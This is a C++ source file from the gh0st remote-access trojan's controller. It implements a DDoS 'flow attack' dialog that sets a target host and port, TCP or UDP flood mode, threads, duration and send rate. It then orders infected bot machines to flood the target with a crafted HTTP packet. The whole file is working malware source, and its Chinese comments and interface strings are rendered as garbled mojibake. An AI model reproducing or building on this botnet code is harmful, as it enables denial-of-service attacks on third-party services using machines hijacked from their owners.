// FlowAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "FlowAttackDlg.h"
#include "DDOSAttackDlg.h"
#include "gh0stView.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CFlowAttackDlg dialog


CFlowAttackDlg::CFlowAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFlowAttackDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFlowAttackDlg)
	m_Decimal = _T("");
	m_HexData = _T("");
	m_HostNum = 200;
	m_SendRate = 3;
	m_Thread = 10;
	m_AttackTime = 60;
	m_Target = _T("www.baidu.com");
	m_Port = 80;
	m_Select = TRUE;
	m_Auto = FALSE;
	m_TipShow = _T("");
	//}}AFX_DATA_INIT
	Point = NULL;
	ViewPoint = NULL;
	m_Size = 0;
	iTaskID =100;
}




void CFlowAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFlowAttackDlg)
	DDX_Control(pDX, IDC_COMBO_MODEL, m_ModelCtrl);
	DDX_Control(pDX, IDC_SLIDER_TIME, m_TimeCtrl);
	DDX_Control(pDX, IDC_SLIDER_THREAD, m_ThreadCtrl);
	DDX_Control(pDX, IDC_SPIN_RATE, m_RateCtrl);
	DDX_Control(pDX, IDC_SPIN_NUM, m_HotsNumCtrl);
	DDX_Text(pDX, IDC_EDIT_DECIMAL, m_Decimal);
	DDV_MaxChars(pDX, m_Decimal, 2000);
	DDX_Text(pDX, IDC_EDIT_HEX, m_HexData);
	DDV_MaxChars(pDX, m_HexData, 5000);
	DDX_Text(pDX, IDC_HOSTNUMS, m_HostNum);
	DDV_MinMaxUInt(pDX, m_HostNum, 1, 20000);
	DDX_Text(pDX, IDC_SEND_RATE, m_SendRate);
	DDV_MinMaxUInt(pDX, m_SendRate, 1, 20000);
	DDX_Text(pDX, IDC_THREADNUMS, m_Thread);
	DDV_MinMaxUInt(pDX, m_Thread, 1, 100);
	DDX_Text(pDX, IDC_ATTACKTIMES, m_AttackTime);
	DDV_MinMaxUInt(pDX, m_AttackTime, 1, 60000);
	DDX_Text(pDX, IDC_TARGET_WEB, m_Target);
	DDV_MaxChars(pDX, m_Target, 400);
	DDX_Text(pDX, IDC_ATTCKPORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 1, 65535);
	DDX_Check(pDX, IDC_SELECTHOST, m_Select);
	DDX_Check(pDX, IDC_NEWAUTO, m_Auto);
	DDX_Text(pDX, IDC_EDIT_TIP, m_TipShow);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFlowAttackDlg, CDialog)
	//{{AFX_MSG_MAP(CFlowAttackDlg)
	ON_EN_CHANGE(IDC_EDIT_DECIMAL, OnChangeEditDecimal)
	ON_EN_SETFOCUS(IDC_EDIT_DECIMAL, OnSetfocusEditDecimal)
	ON_EN_SETFOCUS(IDC_EDIT_HEX, OnSetfocusEditHex)
	ON_EN_CHANGE(IDC_EDIT_HEX, OnChangeEditHex)
	ON_WM_SIZE()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_TIME, OnCustomdrawSliderTime)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_THREAD, OnCustomdrawSliderThread)
	ON_BN_CLICKED(IDC_START_ATTACK, OnStartAttack)
	ON_BN_CLICKED(IDC_START_STOP, OnStartStop)
	ON_BN_CLICKED(IDC_SELECTHOST, OnSelecthost)
	ON_EN_CHANGE(IDC_TARGET_WEB, OnChangeTargetWeb)
	ON_EN_SETFOCUS(IDC_TARGET_WEB, OnSetfocusTargetWeb)
	ON_CBN_SETFOCUS(IDC_COMBO_MODEL, OnSetfocusComboModel)
	ON_CBN_SELCHANGE(IDC_COMBO_MODEL, OnSelchangeComboModel)
	ON_EN_SETFOCUS(IDC_THREADNUMS, OnSetfocusThreadnums)
	ON_EN_CHANGE(IDC_THREADNUMS, OnChangeThreadnums)
	ON_EN_CHANGE(IDC_ATTACKTIMES, OnChangeAttacktimes)
	ON_EN_SETFOCUS(IDC_ATTACKTIMES, OnSetfocusAttacktimes)
	ON_EN_SETFOCUS(IDC_SEND_RATE, OnSetfocusSendRate)
	ON_EN_CHANGE(IDC_SEND_RATE, OnChangeSendRate)
	ON_EN_CHANGE(IDC_HOSTNUMS, OnChangeHostnums)
	ON_EN_SETFOCUS(IDC_HOSTNUMS, OnSetfocusHostnums)
	ON_EN_CHANGE(IDC_ATTCKPORT, OnChangeAttckport)
	ON_EN_SETFOCUS(IDC_ATTCKPORT, OnSetfocusAttckport)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()


BEGIN_EASYSIZE_MAP(CFlowAttackDlg)

//EASYSIZE(control,left,top,right,bottom,options)
//ES_BORDER��ʾ�ؼ���Ի���߽磨���¼�Ʊ߽磩�ľ��룻
//ES_KEEPSIZE��ʾ�ؼ�ˮƽ/��ֱ�����ϳߴ籣�ֲ���
//�ؼ�IDֵ��ʾ��ǰ�ؼ���ָ���ؼ�֮��ľ���
//ES_HCENTER��ʾ���ź�ؼ���ָ��λ����ˮƽ����
//ES_VCENTER��ʾ���ź�ؼ���ָ��λ���ڴ�ֱ����

EASYSIZE(IDC_EDIT_HEX,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_EDIT_TIP,ES_BORDER,ES_BORDER,ES_BORDER,ES_BORDER,0)
EASYSIZE(IDC_STATIC_20,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_2,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_3,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_TARGET_WEB,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_COMBO_MODEL,ES_BORDER,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_6,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_4,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_ATTCKPORT,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_7,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_8,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SLIDER_THREAD,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SLIDER_TIME,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_STATIC_11,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_THREADNUMS,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_ATTACKTIMES,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SEND_RATE,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_HOSTNUMS,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SPIN_RATE,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SPIN_NUM,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_NEWAUTO,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_SELECTHOST,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_START_ATTACK,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
EASYSIZE(IDC_START_STOP,ES_KEEPSIZE,ES_BORDER,ES_BORDER,ES_KEEPSIZE,0)
END_EASYSIZE_MAP

/////////////////////////////////////////////////////////////////////////////
// CFlowAttackDlg message handlers
static CHAR TempBuffer[5000]={NULL};

//����ֵ��Ϊ��  ʹ����� ����delete�����صĻ�����..
//�ַ���ת��Ϊ ʮ�������ַ���
//����ֵ ���ʧ�� ���� NULL
static CHAR ResultDec[5000]={NULL};

LPSTR DecimalToHex(LPSTR Transition=NULL)
{
	
	if(Transition == NULL || strlen(Transition)==NULL)
			return NULL;
	ZeroMemory(ResultDec,sizeof(ResultDec));

	WORD Size = strlen(Transition);
	
	CHAR Temp[3]={NULL};

	for (WORD i=0;i<Size;i++)
	{
		wsprintf(Temp,"%02X ",(UCHAR)Transition[i]&255);
		strcat(ResultDec,Temp);
	}
	return ResultDec;
}

WORD CFlowAttackDlg::ForMatFlowAddr(LPSTR szAddr,WORD iPort)
{
	CHAR *Point = strstr(szAddr,"http://");
	if(Point)
		Point+=7;
	else
		Point = szAddr;
	
	CHAR Addr[400]={NULL};
	strcpy(Addr,Point);
	
	Point = Addr;
	CHAR *Temp = strstr(Addr,"/");
	if(Temp)
		*Temp ='\0';
	
	CHAR *Port=strstr(Point,":");
	
	if(Port)
	{
		*Port='\0';
		Port++;
		strcpy(szAddr,Addr);
		return atoi(Port);
	}
	
	strcpy(szAddr,Addr);
	return iPort;
}

void CFlowAttackDlg::OnStartAttack() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	//���˵�һЩ������ַ�....
	if(m_Port<0 || m_Port >65535)
	{
		MessageBox("�˿ڴ���!");
		return;
	}
	if(m_Target.GetLength()<=0 ||m_Target.GetLength()>400)
	{
		MessageBox("Ŀ�����!");
		return;
	}
	
	ATTACK m_Attack;
	m_Port = ForMatFlowAddr(m_Target.GetBuffer(0),m_Port);

	strcpy(m_Attack.Target,m_Target);

	m_Attack.AttackPort = m_Port;
	m_Attack.AttackTime = m_AttackTime;
	m_Attack.AttackThread = m_Thread;
	m_Attack.ExtendData2 = m_SendRate*1000;
	
	//�õ���������
	CString szType;
	GetDlgItemText(IDC_COMBO_MODEL,szType);

	if(szType =="TCP ����")
		m_Attack.AttackType = CUSTOM_TCPSEND;
	if(szType =="UDP ����")
		m_Attack.AttackType = CUSTOM_UDPSEND;

	
	//��װ���ݰ� ֻ��װ16����
	ZeroMemory(TempBuffer,5000);
	m_Size =0;
	GetDlgItemText(IDC_EDIT_HEX,TempBuffer,5000);
	
	LPSTR Data = HexToDecimal(TempBuffer,FALSE);//ע������ ����Ҫ��ʽ�� Ҫԭʼ���ݰ�
	
	memcpy(m_Attack.SendData,Data,m_Size);
	//�õ����ݰ��Ĵ�С..
	m_Attack.DataSize = m_Size;
	

	signed int HostNums =-1;
	if(m_Select)
		HostNums = -1;
	else
		HostNums = m_HostNum;

	CGh0stView *m_Point=(CGh0stView *)ViewPoint;
	WORD Ret=m_Point->SendDDosAttackCommand(&m_Attack,HostNums,m_Auto,iTaskID);

	CDDOSAttackDlg *m_AttackPoint =(CDDOSAttackDlg *)Point;
	CString szShow;
	szShow.Format("�ɹ����� %d ����ʼ���� ����ID:%d",Ret,iTaskID);
	m_AttackPoint->StatusTextOut(0,szShow);

	GetDlgItem(IDC_START_ATTACK)->EnableWindow(FALSE);
	GetDlgItem(IDC_START_STOP)->EnableWindow(TRUE);
}

BOOL CFlowAttackDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	if(Point == NULL || ViewPoint == NULL)
	{
		MessageBox("��ʼ������ʧ��!");
	}

	m_HotsNumCtrl.SetRange(1,20000);
	m_HotsNumCtrl.SetPos(200);
	m_HotsNumCtrl.SetBuddy(GetDlgItem(IDC_HOSTNUMS));
	

	m_RateCtrl.SetRange(1,20000);
	m_RateCtrl.SetPos(200);
	m_RateCtrl.SetBuddy(GetDlgItem(IDC_SEND_RATE));

	m_ThreadCtrl.SetRange(1,100);
	m_ThreadCtrl.SetPos(10);
	
	m_TimeCtrl.SetRange(1,600);
	m_TimeCtrl.SetPos(60);

	m_ModelCtrl.SetCurSel(0);

	CHAR SendBuffer[]=
	"GET /dosmonitor.exe HTTP/1.1\r\n"
	"Accept: application/x-shockwave-flash, image/gif, "
	"image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, "
	"application/vnd.ms-powerpoint, application/msword, application/xaml+xml, "
	"application/x-ms-xbap, application/x-ms-application, application/QVOD, application/QVOD, */*\r\n"
	"Accept-Language: zh-cn\r\n"
	"Accept-Encoding: gzip, deflate\r\n"
	"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E; TheWorld)\r\n"
	"Host: localhost:8080\r\n"
	"Connection: Keep-Alive\r\n"
	"\r\n"
	"\r\n";
	
	SetDlgItemText(IDC_EDIT_DECIMAL,SendBuffer);
	SetDlgItemText(IDC_EDIT_HEX,DecimalToHex(SendBuffer));
	GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
	GetDlgItem(IDC_SPIN_NUM)->EnableWindow(FALSE);

	INIT_EASYSIZE;

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CFlowAttackDlg::OnChangeEditDecimal() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	if(m_MarkPos)
		return;

	m_TipShow="�ַ��༭.���Դ�ץ�������������!";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);

	ZeroMemory(TempBuffer,5000);

	GetDlgItemText(IDC_EDIT_DECIMAL,TempBuffer,5000);

	SetDlgItemText(IDC_EDIT_HEX,DecimalToHex(TempBuffer));
	
	int i = ((CEdit *)GetDlgItem(IDC_EDIT_HEX))->GetLineCount();

	((CEdit *)GetDlgItem(IDC_EDIT_HEX))->LineScroll(i);
}

void CFlowAttackDlg::OnSetfocusEditDecimal() 
{
	// TODO: Add your control notification handler code here
	m_MarkPos=FALSE; 
}

void CFlowAttackDlg::OnSetfocusEditHex() 
{
	// TODO: Add your control notification handler code here
	m_MarkPos = TRUE;		
}


CHAR CFlowAttackDlg::htod(CHAR c)
{
	c=tolower(c);
	if(c>=48&&c<=57)
		return CHAR(c-48);
	if(c>=97&&c<=102)
		return CHAR(c-97+10);

	return FALSE;
}

static CHAR ResultHex[5000]={NULL};

LPSTR CFlowAttackDlg::HexToDecimal(LPSTR Transition,BOOL Format)
{
	if(Transition==NULL)
		return NULL;
	m_Size = 0;

	ZeroMemory(ResultHex,sizeof(ResultHex));
	
	WORD Size=strlen(Transition);
	
	if(Size > sizeof(ResultHex))
		return NULL;

	CHAR Temp=0;
	WORD iCount =0;
	for (WORD i=0;i<Size;i++)
	{
		if(Transition[i]==' '||Transition[i]=='\r' || Transition[i]=='\n')
			continue;
		Temp=htod(Transition[i])*16;
		i++;
		Temp+=htod(Transition[i]);
		if(Format)
			if(Temp==0) Temp='.';

		ResultHex[iCount]=Temp;
		iCount++;
	}
	m_Size = iCount;
	return ResultHex;
}


BOOL CheckString(CHAR c)
{
	if(c==' ' || c=='\r' || c=='\n')
		return TRUE;

	if(c<48)
		return FALSE;
	if(c>57 && c< 97)
		return FALSE;
	if(c > 102)
		return FALSE;

	return TRUE;
}

void CFlowAttackDlg::OnChangeEditHex() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	if(!m_MarkPos)
		return;

	m_TipShow="16 ���ƴ��� ���Դ� �κ�ץ������ϸ��Ʊ�׼��16��������.";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);

	ZeroMemory(TempBuffer,5000);

	int len = GetDlgItemText(IDC_EDIT_HEX,TempBuffer,5000);
	CHAR CheckStr[5000]={NULL};
	strcpy(CheckStr,TempBuffer);


	//����Ƿ��в��Ϸ����ַ�
	for (WORD i=0;i<len;i++) 
	{
		//ת��ΪСд �ֹ�.
		if(CheckStr[i]>=65 && CheckStr[i]<=90)
			CheckStr[i]+=32;
		

		if(!CheckString(CheckStr[i]))
		{
			MessageBox("����ֵ����16����!!","����",MB_OK|MB_ICONWARNING);
			return;
		}
	}
	SetDlgItemText(IDC_EDIT_DECIMAL,HexToDecimal(TempBuffer,TRUE));

	 i = ((CEdit *)GetDlgItem(IDC_EDIT_DECIMAL))->GetLineCount();

	((CEdit *)GetDlgItem(IDC_EDIT_DECIMAL))->LineScroll(i);
}


void CFlowAttackDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	
	UPDATE_EASYSIZE;
}

void CFlowAttackDlg::OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	m_AttackTime = m_TimeCtrl.GetPos();
	SetDlgItemInt(IDC_ATTACKTIMES,m_AttackTime);
	m_TipShow="ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n"
		"��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
	*pResult = 0;
}

void CFlowAttackDlg::OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	m_Thread = m_ThreadCtrl.GetPos();
	SetDlgItemInt(IDC_THREADNUMS,m_Thread);
	ShowThreads();
	*pResult = 0;
}


void CFlowAttackDlg::OnStartStop() 
{
	// TODO: Add your control notification handler code here
	CGh0stView *m_Point=(CGh0stView *)ViewPoint;

	WORD Ret=m_Point->SendDDostStopCommand(iTaskID);

	CDDOSAttackDlg *m_AttackPoint =(CDDOSAttackDlg *)Point;
	CString szShow;
	szShow.Format("�ɹ����� %d ��ֹͣ���� ����ID:%d",Ret,iTaskID);
	m_AttackPoint->StatusTextOut(0,szShow);

	GetDlgItem(IDC_START_ATTACK)->EnableWindow(TRUE);
	GetDlgItem(IDC_START_STOP)->EnableWindow(FALSE);

}

void CFlowAttackDlg::OnSelecthost() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	if(m_Select)
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(TRUE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(TRUE);
	}
}

//����
void CFlowAttackDlg::OnChangeTargetWeb() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	CString temp ="Ŀ���������д��ȷ,�����TCP ģʽ ��ȷ���Ƿ����������Ŀ��! UDP ���Ժ���!";
	SetDlgItemText(IDC_EDIT_TIP,temp);
}

void CFlowAttackDlg::OnSetfocusTargetWeb() 
{
	// TODO: Add your control notification handler code here
	CString temp ="Ŀ���������д��ȷ,�����TCP ģʽ ��ȷ���Ƿ����������Ŀ��! UDP ���Ժ���!";
	SetDlgItemText(IDC_EDIT_TIP,temp);
}


//ģʽ
void CFlowAttackDlg::OnSetfocusComboModel() 
{
	// TODO: Add your control notification handler code here
	CString temp;
	GetDlgItemText(IDC_COMBO_MODEL,temp);
	
	if(temp=="TCP ����")
		m_TipShow="TCP ���������ӵ� �� �Ὠ��һ������.���ӳɹ����ܷ�������\r\n";
	if(temp =="UDP ����")
		m_TipShow="UDP �������� ֻ�������ݰ� ���ܶԷ��Ƿ���ܵ�������ݰ�\r\n";

	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);	
}

void CFlowAttackDlg::OnSelchangeComboModel() 
{
	// TODO: Add your control notification handler code here
	
}
VOID CFlowAttackDlg::ShowThreads()
{	
	if(m_Thread<=20)
		m_TipShow ="�߳�һ��,����CPUռ��20%����,���ռ��60%����,�����������������";
	if(m_Thread>20&&m_Thread<40)
		m_TipShow ="�̹߳���,����CPUռ��50%����,���ռ��80%����,���������������ľ�,���ҵ���";
	if(m_Thread>40&&m_Thread<100)
		m_TipShow ="�̹߳���,����CPUռ��80%����,����ľ�,�����޷�����ֹͣ����,���Ҽ��������������,����,�����鿼��!";
	
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}


//�̷߳��͸ı�
void CFlowAttackDlg::OnSetfocusThreadnums() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}
void CFlowAttackDlg::OnChangeThreadnums() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	UpdateData(TRUE);
	ShowThreads();
	// TODO: Add your control notification handler code here	
}
//ʱ�䷢���ı�
void CFlowAttackDlg::OnChangeAttacktimes() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	m_TipShow="ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n"
		"��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.��λΪ����";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}

void CFlowAttackDlg::OnSetfocusAttacktimes() 
{
	// TODO: Add your control notification handler code here
	m_TipShow="ʱ�����ǳ���Ҫ ����ƶ�ͻȻ����,����ͣ��,�쳣,�Լ���������ľ�,���޷�����,�޷�����ֹͣ����\r\n"
		"��ô�⽫�Ǻܿ��µ���.����ó���ʱ��,����˽��ڳ���ʱ���ʱ�������ֹͣ!.��λΪ����";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}

//�����ٶȷ����ı�
void CFlowAttackDlg::OnSetfocusSendRate() 
{
	// TODO: Add your control notification handler code here
	m_TipShow="ʱ�䵥λΪ�� ���Ʒ������ٶ� �ȷ���һ�����ݰ� ��Ϣ������.";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}

void CFlowAttackDlg::OnChangeSendRate() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	m_TipShow="ʱ�䵥λΪ�� ���Ʒ������ٶ� �ȷ���һ�����ݰ� ��Ϣ������.";
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}


//�������������ı�
void CFlowAttackDlg::OnChangeHostnums() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	m_TipShow="����ķ������� ����ʵ�ֶ�Ŀ�깥�� ���͹���ʱ �������Ѿ��ڹ����е�����!\r\n"
		"ֻ�п��������Ž������� �����м���! ��ϸ�뿴 ��������->DDOS״̬.";
	
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}

void CFlowAttackDlg::OnSetfocusHostnums() 
{
	// TODO: Add your control notification handler code here
	m_TipShow="����ķ������� ����ʵ�ֶ�Ŀ�깥�� ���͹���ʱ �������Ѿ��ڹ����е�����!\r\n"
		"ֻ�п��������Ž������� �����м���! ��ϸ�뿴 ��������->DDOS״̬.";
	
	SetDlgItemText(IDC_EDIT_TIP,m_TipShow);
}


//�˿ڷ����ı�
void CFlowAttackDlg::OnChangeAttckport() 
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	
	// TODO: Add your control notification handler code here
	CString temp ="Ŀ���������д��ȷ�����Ŀ������վ��Ŀ����뱣֤�������������Դ�!\r\n"
		"���ѡ�����TCPģʽ,�����л������ɷ���˴���,�м򵥵Ĳ������ӹ���!����ģʽ�޷����� �������ж�!";
	SetDlgItemText(IDC_EDIT_TIP,temp);
}

void CFlowAttackDlg::OnSetfocusAttckport() 
{
	// TODO: Add your control notification handler code here
	CString temp ="Ŀ���������д��ȷ�����Ŀ������վ��Ŀ����뱣֤�������������Դ�!\r\n"
		"���ѡ�����TCPģʽ,�����л������ɷ���˴���,�м򵥵Ĳ������ӹ���!����ģʽ�޷����� �������ж�!";
	SetDlgItemText(IDC_EDIT_TIP,temp);
}

HBRUSH CFlowAttackDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_TIP) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		CFont font;
		font.CreatePointFont(90,"����");
		pDC->SelectObject(&font);
		
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}
